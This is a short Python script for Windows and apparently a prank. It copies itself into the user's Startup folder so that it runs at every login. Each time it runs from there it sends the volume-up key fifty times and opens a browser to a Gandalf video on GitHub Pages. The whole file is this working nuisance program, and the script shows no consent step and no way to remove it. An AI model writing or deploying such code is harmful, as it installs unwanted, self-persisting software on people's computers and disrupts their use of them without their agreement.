from shutil import copy
import os,time
from os import getenv, listdir, startfile
from os.path import isdir, isfile
from ctypes import WinDLL
user32 = WinDLL("user32")


file = os.path.basename(__file__)
path = f"%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/{file}" % getenv("userprofile")


if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()

for _ in range(50):
    user32.keybd_event(0xAF, 0, 0, 0)
    user32.keybd_event(0xAF, 0, 2, 0)
os.system("start https://eograhix.github.io/gandalf.mp4")
